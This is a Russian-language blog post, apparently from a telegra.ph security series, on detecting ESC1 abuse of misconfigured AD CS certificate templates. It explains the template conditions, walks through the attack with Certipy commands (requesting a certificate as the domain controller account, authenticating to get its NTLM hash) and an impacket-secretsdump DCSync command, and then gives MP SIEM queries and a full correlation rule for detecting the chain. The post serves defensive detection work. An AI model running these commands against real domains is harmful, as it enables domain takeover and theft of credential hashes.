# ESC1
Detecting ESC1: Misconfigured Certificate Templates exploitation
![ESC1 scheme](https://telegra.ph/file/89e02019e9475c0786b20.png)
Суть атаки заключается в неправильно сконфигурированных шаблонах сертификатов (<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1">Misconfigured Certificate Templates</a>). О том, что такое уязвимый шаблон, мы поговорим подробнее.

## Условия существования уязвимости
Давайте поймем, при каких обстоятельствах будет возможно осуществление этой атаки.
- Центр сертификации (CA) предоставляет пользователям с низким уровнем привилегий права на запрос сертификата;
- Одобрение выдачи отключено;
- Authorized signature не требуется;
- Дескриптор безопасности уязвимого шаблона предоставляет права запроса сертификата пользователям с низким уровнем привилегий.
- Шаблон сертификата определяет EKU (Extended Key Usage), которые включают:
    - Client Authentication (OID 1.3.6.1.5.5.7.3.2);
    - PKINIT Client Authentication (1.3.6.1.5.2.3.4);
    - Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2);
    - Any Purpose (OID 2.5. 29.37.0);
    - no EKU (SubCA).
- Шаблон сертификата **позволяет запрашивающим указать subjectAltName в CSR:**
    - AD будет использовать идентификатор, указанный в поле **subjectAltName** (SAN), если он указан. Следовательно, если запрашивающая сторона может указать SAN, то появляется возможность **запросить сертификат от имени любого пользователя** (например, от имени администратора домена). Эта возможность определена в свойстве mspki-certificate-name-flag, которое представляет собой битовую маску: в случае, если установлен флаг CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, запрашивающий может указать любой SAN.
Все эта настройки позволяют пользователю с низким уровнем привилегий запрашивать сертификат с произвольным SAN, что даёт ему возможность проходить аутентификацию в домене от имени любого пользователя. 
Такая возможность часто может быть включена, например, чтобы позволить продуктам или службам генерировать HTTPS сертификаты  или сертификаты для хостов «на лету». Также уязвимый шаблон может существовать из-за нехватки знаний сотрудника, ответственного за настройку AD CS.
Один из вариантов атаки на службу сертификатов я рассматривал в <a href="https://telegra.ph/Exploiting-Active-Directory-03-30-3">статье эксплуатации AD</a>. Сегодня мы рассмотрим всю цепочку атаки наиболее подробно, при этом при помощи уязвимого шаблона скомпрометируем весь домен!

## Атака от лица злоумышленника
В первую очередь для атаки на домен нам необходимы учетные данные. Чтобы не растягивать материал, предположим, что они у нас уже есть.
О том, как получать первоначальный набор учетных данных, я рассказывал в статьях <a href="https://telegra.ph/Breaching-Active-Directory-03-24">Breaching AD</a> и <a href="https://telegra.ph/Credentials-Harvesting-04-06">Credentials Harvesting</a>. 
После получения учетных данных важным этапом является разведка. И на эту тему у меня тоже есть <a href="https://telegra.ph/Enumerating-Active-Directory-03-24">материал</a>. Условимся, что нам удалось скомпрометировать учетную запись непривилегированного пользователя в домене, благодаря ей перечислить LDAP и найти уязвимую учетную запись компьютера. После этого приступим к магии с сертификатами!

### Разведка
Первым делом нам необходимо провести "разведку" в отношении центра сертификации. Для этого воспользуемся опенсорсной утилитой Certipy (https://github.com/ly4k/Certipy)
Её установка очень проста:
```bash
pip3 install certipy-ad
```
Если во время установки появляется проблема с сертификатами, решить её можно следующим образом:
```bash
pip3 install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org certipy-ad
``` 

Далее при помощи установленной утилиты и имеющейся учетной записи пользователя осуществляем разведу:
```bash
certipy find -u 'user@domain'
```

![Сканирование возможных векторов атаки](https://telegra.ph/file/3c9ae68761a99c7393950.png)

В результате разведки мы получаем файлы в формате json и txt.
Рассмотрим подробнее содержимое .txt. В нем перечислены обнаруженные шаблоны сертификатов. Для каждого из шаблонов мы получаем возможные векторы эксплуатации. В моём случае уязвимым оказался шаблон с номером 3:
![Уязвимый к ESC1 шаблон сертификатов](https://telegra.ph/file/7a1d07d5a3e797f4dcf97.png)

#### Поиск связанных событий в SIEM

Certipy не работает бесследно, и в SIEM мы можем запросто наблюдать активность, свидетельствующую о разведке в отношении AD CS. В моём случае я выявил следующие запросы со стороны атакующего (приведены конкретные фильтры для MP SIEM):

```pdql
object.value = "cn,name,displayName,pKIExpirationPeriod,pKIOverlapPeriod,msPKI-Enrollment-Flag,msPKI-Private-Key-Flag,msPKI-Certificate-Name-Flag,msPKI-Minimal-Key-Size,msPKI-RA-Signature,pKIExtendedKeyUsage,nTSecurityDescriptor,objectGUID"

object.query = "(objectClass=pKICertificateTemplate)"

object.value = "cn,name,dNSHostName,cACertificateDN,cACertificate,certificateTemplates,objectGUID"

object.query = "( &  (objectClass=pKIEnrollmentService) )"
```

На текущем этапе мы знаем всё, что нужно, для осуществления дальнейшей атаки. Приступим к эксплуатации!


### Эксплуатация
Мы знаем имя уязвимого шаблона (WebserverwithClientauthEKU), а также на этапе разведки нами получена уязвимая учетная запись компьютера. Так как этот шаблон позволяет объектам из группы Domain Computers запрашивать сертификаты с SAN, не составит труда проэксплуатировать обнаруженный миссконфиг:
```bash
certipy req -u computer@domain -target ca.domain -ca 'CA NAME' -template WebserverwithClientauthEKU -upn "dc1$@domain" -dc-ip 10.10.10.10
```
![Эксплуатация уязвимого шаблона сертификата](https://telegra.ph/file/b3610b08ed4227f3cfd57.png)

В данном случае я осуществляю запрос сертификата с SAN, в котором указываю учетную запись контроллера домена. Это необязательно должно быть так, вместо контроллера домена может быть любой доменный администратор, но во многих организациях администраторы домена включены в группу Protected Users, что ужесточает требования к их авторизации на узлах сети. Далее из-за этого вполне могли возникнуть проблемы с попыткой дампа NTDS.dit, но учетной записи контроллера домена нам будет более чем достаточно, так как интересующими нас привилегиями она точно обладает и позволит в будущем осуществить атаку DCSync.
Ещё раз оговорюсь, что для успешной эксплуатации ранее была скомпрометирована машинная учетная запись. А как мы видели из шаблона, машинная учетная запись может выпускать сертификаты с альтернативным именем.

После выпуска сертификата нам необходимо авторизоваться на контроллере домена (запросить TGT), чтобы затем восстановить хэш пароля учетной записи:
```bash
certipy auth -pfx dc1.pfx -dc-ip 10.10.10.11
```
![[Извлечение хэша учетной записи путем авторизации с сертификатом на контроллере домена]](https://telegra.ph/file/a1fb0de721ee381ced46b.png)

Для авторизации мы используем полученный на этапе ранее сертификат, и в результате получаем заветный NTLM-хэш учетной записи контроллера домена.

#### Давайте посмотрим, как наша активность выглядит в SIEM
На этом этапе синяя команда увидит корреляцию, которая позволяет отследить авторизацию на контроллере домена с сертификатом:
**DC_Auth_with_Pfx** (правило корреляции входит в пакет экспертизы от PT). Текст скоррелированного события выглядит примерно так: "пользователь dc1$ с узла 10.0.0.1 (узел атакующего) запросил билет TGT с помощью сертификата или смарт-карты, изданных "CA NAME""
Проанализируем правило корреляции:

```pdql
event TGT_by_Cert:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator()
        and event_src.title == "windows"
        and msgid == "4768"
        and logon_type == 16
        and datafield7 != null
        and match(subject.account.name, "*$")
        and filter::CheckWL_Specific_Only("DC_Auth_with_Pfx", join([lower(subject.account.name), src.ip], "|"))
    }

rule DC_Auth_with_Pfx: TGT_by_Cert

...
```

В данном случае нас интересует событие 4768.
Это событие регистрируется только на контроллерах домена, при этом регистрируются как успешные, так и неудачные экземпляры этого события.
В начале дня, когда пользователь садится за свою рабочую станцию ​​и вводит имя своего доменного пользователя и его пароль, рабочая станция связывается с контроллером домена и запрашивает TGT. Если имя пользователя и пароль верны, и учетная запись пользователя проходит проверки состояния в группах и ограничений, контроллер домена предоставляет TGT и регистрирует событие с идентификатором 4768 (билет аутентификации предоставлен).  
Если запрос билета завершается неудачно, Windows зарегистрирует это событие или 4771 с указанием типа «сбой».

Поле "User" для этого события (и всех других событий в категории «Audit account logon») не помогает определить пользователя: оно всегда имеет значение N/A. Тут лучше посмотреть на поля «Account Information», которые идентифицируют пользователя, вошедшего в систему, и DNS-суффикс учетной записи пользователя. Поле User ID содержит SID учетной записи. 

Windows регистрирует другие случаи события с кодом 4768, когда компьютеру в домене необходимо пройти проверку подлинности на контроллере домена, обычно при загрузке рабочей станции или перезапуске сервера. В этих случаях в поле «User Name» вы увидите имя компьютера. Учетные записи компьютера могут быть легко распознаны, так как всегда обозначаются знаком `$` после имени учетной записи.

В нашем случае, согласно правилу корреляции, нас интересует поле PreAuthType, равное 16 (в SIEM поле при нормализации попадает в logon_type), при этом важным этапом является наличие нормализованного поля datafield7, куда падает имя центра сертификации, выдавшего сертификат.
Следовательно, запрос в SIEM согласно корреляции будет выглядеть следующим образом:
```pdql
event_src.title = "windows" AND msgid = "4768" AND logon_type = 16 AND datafield7 != null AND subject.account.name endswith "$"
```
![События 4768 с logon_type = 16](https://telegra.ph/file/3ef12469faa3dedb88c51.png)
![Нормализованные поля события 4768 с logon_type = 16](https://telegra.ph/file/3a0f3293049b4d025245a.png)

А вот пример сырого события:
```
{
  "Event": {
    "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
    "System": {
      "Provider": {
        "Name": "Microsoft-Windows-Security-Auditing",
        "Guid": "..."
      },
      "EventID": "4768",
      "Version": "0",
      "Level": "0",
      "Task": "14339",
      "Opcode": "0",
      "Keywords": "0x8020000000000000",
      "TimeCreated": {
        "SystemTime": "2023-08-25T03:41:31.933004900Z"
      },
      "EventRecordID": "36888427414",
      "Correlation": null,
      "Execution": {
        "ProcessID": "924",
        "ThreadID": "8060"
      },
      "Channel": "Security",
      "Computer": "dc2.domain",
      "Security": null
    },
    "EventData": {
      "Data": [
        {
          "text": "DC1$",
          "Name": "TargetUserName"
        },
        {
          "text": "DOMAIN",
          "Name": "TargetDomainName"
        },
        {
          "text": "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx9",
          "Name": "TargetSid"
        },
        {
          "text": "krbtgt",
          "Name": "ServiceName"
        },
        {
          "text": "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-502",
          "Name": "ServiceSid"
        },
        {
          "text": "...",
          "Name": "TicketOptions"
        },
        {
          "text": "0x0",
          "Name": "Status"
        },
        {
          "text": "0x12",
          "Name": "TicketEncryptionType"
        },
        {
          "text": "16",
          "Name": "PreAuthType"
        },
        {
          "text": "10.0.0.1",
          "Name": "IpAddress"
        },
        {
          "text": "49229",
          "Name": "IpPort"
        },
        {
          "text": "CA NAME",
          "Name": "CertIssuerName"
        },
        {
          "text": "...",
          "Name": "CertSerialNumber"
        },
        {
          "text": "...",
          "Name": "CertThumbprint"
        }
      ]
    }
  }
}
```

Естественно, такая активность аномальна как минимум потому, что "левый" узел запрашивает TGT для контроллера домена.

Теперь у нас еть всё необходимое, чтобы осуществить DCSync!
Для этого используем излюбленный secretsdump из набора Impacket:

```bash
impacket-secretsdump -outputfile dcsync.txt -hashes aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx domain/dc1\$@10.10.10.11
```
![DCSync](https://telegra.ph/file/d669cddfe75b37bc14d9d.png)
Домен захвачен!


## Детектим вредоносную активность в логах CA
Давайте напишем правило корреляции, позволяющее обнаруживать эксплуатацию уязвимого шаблона.
Так как этап разведки выявляется коробочными правилами, авторизация на контроллере домена также видна, осталось лишь завершить автоматический детект киллчейна самописным правилом.
Оно, на самом деле, будет использовать похожий на ESC8 механизм детекта (мы также используем события 4624, 4886 и 4887), за исключением одного момента: здесь адрес атакуемой машины можно будет получить из события с EventId 4624 (успешная авторизация), в отличие от ESC8, где мы получали событие логина путём поиска обращения на 80 порт центра сертификации.
Фильтры для поиска событий, сигнализирующих о попытке проведения атаки, будут выглядеть следующим образом: 

**Авторизация**:
```pdql
msgid = "4624" and event_src.hostname = "ca" and status = "success" and logon_service = "NtLmSsp"
```

**Запрос на выдачу сертификата**:
```pdql
msgid == "4886" and event_src.hostname = "ca"
``` 

**Событие успешной выдачи сертификата**:
```pdql
msgid == "4887" and event_src.hostname = "ca" and datafield3 != null
```

Связывающим звеном между тремя событиями будет `event_src.host` (центр сертификации) и поле `subject.name` (имя учетной записи, под которой осуществляется авторизация на CA и запрос сертификата). Они же будут ключами при корреляции инцидента. В рассмотренном выше случае `subject.name` — имя эксплуатируемой компьютерной учетной записи.

Правило корреляции использует табличный список `Certification_Authority_hosts`, содержащий два строковых поля `ip` и `fqdn` и заполняемый вручную. Для проверки принадлежности узла к центрам сертификации в корреляции используется query с именем `CertificationAuthority`, принимающая на вход IP-адрес и fqdn хоста.
Результирующее правило выглядит так:

```
query CertificationAuthority($ip, $fqdn) from Certification_Authority_hosts {
    (
        (ip != null and ip == $ip)
        or (fqdn != null and fqdn == $fqdn)
    )
}

event Successful_Login_on_CA:
    key:
        event_src.host, subject.name
    filter {
        filter::NotFromCorrelator()
        and msgid == "4624"
        and exec_query("CertificationAuthority", [recv_ipv4, event_src.host])
        and status == "success"
        and logon_service == "NtLmSsp"
    }

event CA_Certificate_Request:
    key:
        event_src.host, subject.name
    filter {
        filter::NotFromCorrelator()
        and msgid == "4886"
        and exec_query("CertificationAuthority", [recv_ipv4, event_src.host])
    }

event CA_Certificate_Issue:
    key:
        event_src.host, subject.name
    filter {
        filter::NotFromCorrelator()
        and msgid == "4887"
        and exec_query("CertificationAuthority", [recv_ipv4, event_src.host])
        and datafield3 != null
    } 
    

rule Possible_ESC1_CA_Attack: (Successful_Login_on_CA and CA_Certificate_Request and CA_Certificate_Issue) timer 1m

    init {
    	$labels = "w_auto"
    }

    on Successful_Login_on_CA {
        $status = status
        $logon_service = logon_service
        $logon_type = logon_type
        
        $subject.name = subject.name
        $subject.domain = subject.domain
        $subject.id = subject.id
        $subject.account.name = subject.account.name
        $subject.account.domain = subject.account.domain
        $subject.account.session_id = subject.account.session_id
        $subject.account.id = subject.account.id
        
        $datafield2 = "upn="+subject.account.name+"@"+subject.account.domain  # формирование upn=username@domain для дальнейшего сравнения

        $event_src.host = event_src.host
        $event_src.hostname = event_src.hostname
        $event_src.fqdn = event_src.fqdn
        $event_src.asset = event_src.asset
        $event_src.title = event_src.title
        $event_src.vendor = event_src.vendor
        
        $src.ip = src.ip
        $src.host = src.host
        $src.asset = src.asset
        $src.port = src.port
        
        $dst.host = dst.host
        $dst.hostname = dst.hostname
        $dst.ip = dst.ip
        $dst.port = dst.port
        $dst.asset = dst.asset
        $dst.fqdn = dst.fqdn
    }

    on CA_Certificate_Request {
        $object = object
        $object.property = object.property
        $datafield1 = datafield1  # номер запроса сертификата
    }

    on CA_Certificate_Issue {
    	$object.name = object.name
        $object.id = object.id
        $object.state = object.state
        $datafield3 = datafield3

        $alert.key = subject.name
    }

emit {
    $subject = "account"
    $action = "start"

	$importance = "high"
	
    $category.generic = "Attack"
    $category.high = "Credential Access"
    $category.low = "Digital Certificates"
    
    if $datafield3 != $datafield2 then
        $correlation_type = "incident"
        $reason = "Certificate with SAN successfully isuued. Possible ESC1."
    else
    	$correlation_type = "event"
        $reason = "Suspicious certificate retrieval."
    endif
    
	$incident.aggregation.key = join([$correlation_name, $subject.name, $src.ip], "|")
    $incident.severity = "high"
    $incident.category = "UserCompromising"
    $incident.aggregation.timeout = 30m
}

```
Описание скоррелированного события: Обнаружены признаки осуществления успешной атаки ESC1 на AD CS, которая привела к выпуску сертификата CA с SAN.

Событие имеет несколько критериев корреляции:
1. `correlation_name = "Possible_ESC1_CA_Attack" and correlation_type = "event"`
**Значение (английский)**: A sequence of events was found that was characteristic of a successful attack on AD CS ({event_src.host}) from host {src.ip} that resulted in the issuance of a CA certificate for account {subject.name}.
**Значение (русский)**: Обнаружена последовательность событий, характерная для осуществления успешной атаки на AD CS ({event_src.host}) с узла {src.ip}, которая привела к выпуску сертификата CA для учетной записи {subject.name}.

2. `correlation_name = "Possible_ESC1_CA_Attack" and correlation_type = "incident"`
**Значение (английский)**: Detected signs of a successful ESC1 attack on AD CS ({event_src.host}) from host {src.ip} that resulted in the issuance of a CA certificate for the account {subject.name} with the specified SAN {datafield3}.
**Значение (русский)**: Обнаружены признаки осуществления успешной атаки ESC1 на AD CS ({event_src.host}) с узла {src.ip}, которая привела к выпуску сертификата CA для учетной записи {subject.name} с указанным SAN {datafield3}.

Тип корреляции (event, incident) определяется путём сравнения полей datafield2 (создается в скоррелированном событии) и datafield3 (присутствует в событии 4887 и указывает SAN выпущенного сертификата). В случае, если они не совпадают, фиксируется инцидент, так как это явный признак запроса сертификата с указанным SAN, отличающимся от имени учетной записи, запрашивающей его.

Примерное содержимое событий и информацию в скорелированном событии можно увидеть на скриншотах ниже:

Событие успешного входа
![Событие успешного входа](https://telegra.ph/file/eeb10316417125287a96f.png)

Событие запроса сертификата с SAN
![Событие запроса сертификата с SAN](https://telegra.ph/file/bbc0645d9eda2ab6314e1.png)

Событие выдачи сертификата
![Событие выдачи сертификата
](https://telegra.ph/file/e112f3bab48806db98b3d.png)


Результат работы правила корреляции: события, связанные с инцидентом
![События, связанные с инцидентом](https://telegra.ph/file/0c3e57472278fe85b77c4.png)

Подробности скоррелированного события
![Подробности скоррелированного события](https://telegra.ph/file/99d63dd4958b1eac7537b.png)

Подробности скоррелированного события
![Подробности скоррелированного события](https://telegra.ph/file/aca1bcb6497a96f85ac1e.png)
